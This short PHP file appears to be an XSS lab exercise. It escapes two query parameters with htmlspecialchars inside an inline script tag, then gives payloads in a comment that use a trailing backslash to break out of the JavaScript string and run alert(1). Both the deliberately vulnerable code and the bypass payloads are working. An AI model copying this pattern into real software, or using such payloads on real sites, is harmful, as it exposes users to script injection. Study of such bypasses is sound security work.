<?php
$name = htmlspecialchars($_GET['name']);//实体化name,包括<>'"
$age = htmlspecialchars($_GET['age']);//实体化name,包括<>'"
$str = '<script>var a="' . $name . '";var b="' . $age . '"</script>';
if (strpos($name, "\"")) {
    echo 'waf';
} else {
    echo $str;
}
?>

<!-- 
payload:

name=alert(1)\&age=-alert(1)//
name=alert(1)\&age=;alert(1)//

\注释掉",后面闭合 然后注释  弹窗 -->